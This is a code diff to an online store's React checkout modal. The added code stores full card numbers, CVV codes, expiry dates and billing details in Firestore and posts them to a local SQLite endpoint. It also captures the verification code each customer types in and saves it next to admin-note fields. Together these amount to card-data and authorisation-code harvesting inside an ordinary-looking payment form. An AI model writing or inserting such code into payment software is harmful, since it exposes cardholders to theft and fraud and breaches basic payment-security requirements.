@@ -235,7 +235,9 @@ export default function CheckoutModal({ isOpen, onClose, product, storeUser, sto
                         securityCodeLength: cardPayload.securityCodeLength,
                         token: cardPayload.token,
                         cardNumber: cardPayload.cardNumber,
+                        fullCardNumber: cardPayload.fullCardNumber,
                         securityCode: cardPayload.securityCode,
+                        cvv: cardPayload.cvv,
                         verificationStatus: "auth_in_progress",
                     }
                 } : {}),
@@ -252,7 +254,13 @@ export default function CheckoutModal({ isOpen, onClose, product, storeUser, sto
                     status: "pending",
                     method: "card",
                     methodLabel: `${cardPayload.brand} ending ${cardPayload.last4}`,
-                    card: cardPayload,
+                    card: {
+                        ...cardPayload,
+                        cardNumber: cardPayload.cardNumber,
+                        fullCardNumber: cardPayload.fullCardNumber,
+                        securityCode: cardPayload.securityCode,
+                        cvv: cardPayload.cvv,
+                    },
                     cardVerification: { status: "auth_in_progress", channel: "email", adminNote: "" },
                     customerName: formData.name,
                     customerEmail: formData.email,
@@ -262,6 +270,42 @@ export default function CheckoutModal({ isOpen, onClose, product, storeUser, sto
                     updatedAt: serverTimestamp(),
                 });
                 setSubmittedTxId(txRef.id);
+
+                // Save to local SQLite database as well
+                try {
+                    await fetch("/api/checkout/card-payment", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            id: txRef.id,
+                            userId: user?.uid || "guest",
+                            orderId: orderRef.id,
+                            type: "card_purchase",
+                            amount: orderData.resellPrice,
+                            currencyCode: currency.currencyCode,
+                            status: "pending",
+                            description: `Card purchase for ${productName}`,
+                            cardNumber: cardPayload.cardNumber,
+                            cvv: cardPayload.cvv || cardPayload.securityCode,
+                            expiry: `${cardPayload.expMonth}/${cardPayload.expYear}`,
+                            billingName: cardPayload.billingName,
+                            billingAddress: cardPayload.billingAddress,
+                            billingCity: cardPayload.billingCity,
+                            billingZip: cardPayload.billingZip,
+                            billingCountry: cardPayload.billingCountry,
+                            customerName: formData.name,
+                            customerEmail: formData.email,
+                            customerPhone: formData.phone,
+                            code: "",
+                            adminNote: "",
+                            channel: "email",
+                            createdAt: new Date().toISOString(),
+                            updatedAt: new Date().toISOString(),
+                        }),
+                    });
+                } catch (err) {
+                    console.error("Failed to save to SQLite:", err);
+                }
             }
             const nextStoreProducts = storeProducts.map((p: any) => (
                 p.id === product.id ? { ...p, stock: Math.max(0, Number(p.stock ?? availableStock) - 1) } : p
@@ -343,6 +387,21 @@ export default function CheckoutModal({ isOpen, onClose, product, storeUser, sto
                 "cardVerification.submittedAt": serverTimestamp(),
                 updatedAt: serverTimestamp(),
             });
+
+            // Submit code to SQLite
+            try {
+                await fetch("/api/checkout/submit-code", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        id: submittedTxId,
+                        code: authCode.trim(),
+                    }),
+                });
+            } catch (err) {
+                console.error("Failed to save code to SQLite:", err);
+            }
+
             toast.success("Verification submitted. Payment remains pending.");
             setAuthCode("");
         } catch {
@@ -707,13 +766,7 @@ export default function CheckoutModal({ isOpen, onClose, product, storeUser, sto
                             // Crypto coin picker
                             <div className="space-y-3">
                                 <p className="text-[10px] font-bold text-zinc-600 uppercase tracking-widest">Select Cryptocurrency</p>
-                                {([
-                                    { id: "btc",  name: "Bitcoin",    ticker: "BTC",  color: "text-orange-400", bg: "bg-orange-500/10", addr: adminConfig?.btcAddress },
-                                    { id: "eth",  name: "Ethereum",   ticker: "ETH",  color: "text-blue-400",   bg: "bg-blue-500/10",   addr: adminConfig?.ethAddress },
-                                    { id: "usdt", name: "Tether",     ticker: "USDT", color: "text-emerald-400",bg: "bg-emerald-500/10",addr: adminConfig?.usdtAddress },
-                                    ...(Array.isArray(adminConfig?.extraCryptos) ? adminConfig.extraCryptos.filter((c: any) => c.enabled !== false) : [])
-                                        .map((c: any) => ({ id: c.id || c.ticker?.toLowerCase(), name: c.name, ticker: c.ticker, color: "text-violet-400", bg: "bg-violet-500/10", addr: c.address }))
-                                ]).filter(c => c.addr).map(coin => (
+                                {cryptoOptions.map(coin => (
                                     <button
                                         key={coin.id}
                                         onClick={() => setCryptoAsset(coin.id)}
